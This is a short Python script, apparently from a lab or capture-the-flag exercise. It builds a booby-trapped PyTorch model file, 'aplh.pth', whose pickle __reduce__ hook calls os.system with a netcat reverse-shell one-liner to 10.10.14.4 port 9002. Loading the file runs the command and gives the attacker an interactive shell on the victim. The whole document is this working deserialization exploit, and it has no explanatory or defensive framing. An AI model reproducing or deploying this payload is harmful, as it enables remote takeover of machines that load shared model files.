import torch
import torch.nn as nn
import os

class MaliciousModel(nn.Module):
    def __init__(self):
        super(MaliciousModel, self).__init__()
        self.dense = nn.Linear(10, 1)

    def forward(self, demo):
        return self.dense(demo)

    def __reduce__(self):
        cmd = "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.10.14.4 9002 >/tmp/f"
        return os.system, (cmd,)

malicious_model = MaliciousModel()
torch.save(malicious_model, 'aplh.pth')
